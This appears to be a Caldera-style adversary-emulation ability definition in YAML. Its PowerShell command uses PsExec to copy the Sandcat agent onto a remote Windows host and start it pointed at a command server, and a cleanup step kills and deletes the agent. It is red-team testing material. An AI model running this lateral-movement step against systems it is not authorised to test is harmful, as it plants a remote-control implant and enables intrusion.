---

 - id: bddc0abc-07a0-41b7-813f-e0c64d9226b3
   name: Copy Sandcat File
   description: Copy Sandcat file using PsExec
   tactic: lateral-movement
   technique:
     attack_id: T1105
     name: Remote File Copy
   platforms:
     windows:
       psh:
         command: |
           $out = C:\Windows\System32\PSTools\PsExec64.exe -accepteula -nobanner \\#{remote.host.ip} -d -c -f sandcat.go-windows -server #{server} 2>&1 | %{ "$_" } | Out-String;
           if ($out -Match "started on .* with process ID \d") {
               cmd /c "exit 0";
           } else {
               cmd /c "exit 1";
           }
         payload: sandcat.go-windows
         cleanup: |
           C:\Windows\System32\PSTools\PsExec64.exe -accepteula -nobanner \\#{remote.host.ip} cmd /c "taskkill /F /IM sandcat.go-windows & erase /Q /F C:\Windows\sandcat.go-windows"
